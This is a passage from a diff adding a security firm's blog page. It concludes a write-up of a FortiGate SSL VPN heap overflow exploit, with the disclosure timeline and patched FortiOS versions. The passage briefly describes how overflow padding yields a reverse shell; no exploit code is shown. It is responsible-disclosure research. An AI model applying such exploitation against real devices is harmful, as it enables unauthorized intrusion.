+ Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.</li>
+    </ol>
+
+    <p>Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the <code class="highlighter-rouge">SSL_do_handshake</code>. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.</p>
+  </li>
+</ul>
+
+<h1 id="demo">Demo</h1>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/Aw55HqZW4x0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+
+<h1 id="timeline">Timeline</h1>
+<ul>
+  <li>11 December, 2018 Reported to Fortinet</li>
+  <li>19 March, 2019 All fix scheduled</li>
+  <li>24 May, 2019 All advisory released</li>
+</ul>
+
+<h1 id="fix">Fix</h1>
+<p>Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.</p>
+
+
+              </article>
+              <p class="sns-widgets">
+                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
+              </p>
+          
+              <div class="heading--side-lined">
+                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/meh.jpg)"></span> <a href="/en/blog/author/meh" class="blog-author-name">Meh</a> 
+              </div>
+              <p class="blog-author-info">
+                I am a pwner.
+              </p>
+          
+              <div class="heading--side-lined">
+                Comments
+              </div>
+              <div class="blog-comments">
+                
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+              </div>
+            </div>
+          </div>
+
+
+
+
+
+
+</main>
+      <div class="container--wrapper">
+
+
+        <div class="contact-section container">
+          <h2 class="contact-section__title">
+            Put your defenses to the test with authentic attacks
+          </h2>
+          <a href="/en/contact/" class="home-contact__button button--dense">Contact us now</a>
+        </div>
+
+        <footer class="main-footer">
+          <div class="main-footer__about">
+            DEVCORE offers professional<br class="mobile-only" /><a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services.<br />For <a href="/en/blog/" class="link">latest updates</a>, follow us on <a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a> or <a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>.
+          </div>
+          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
+                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://plus.google.com/118439315679478709768/posts" class="main-footer__sns">
+                <svg class="icon-googleplus icon"><use xlink:href="#icon-googleplus" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
+                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
+          </div>
+          <address class="main-footer__address">
+            <ul class="list--unstyled">
+              <li>
+                10F., No.168, Fuxing N. Rd., Zhongshan Dist., Taipei City 10487, Taiwan (R.O.C.)
+              </li>
+              <li>
+                contact@devco.re
+              </li>
+              <li>
+                +886-2-2718-0156
+              </li>
+            </ul>
+          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2019 DEVCORE</small>
+        </footer>
+      </div>
+    </div>
+    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>
+
+
+
+  <script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-30830800-1']);
+  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+
+
+
+  </body>
+</html>
+
+
+
+
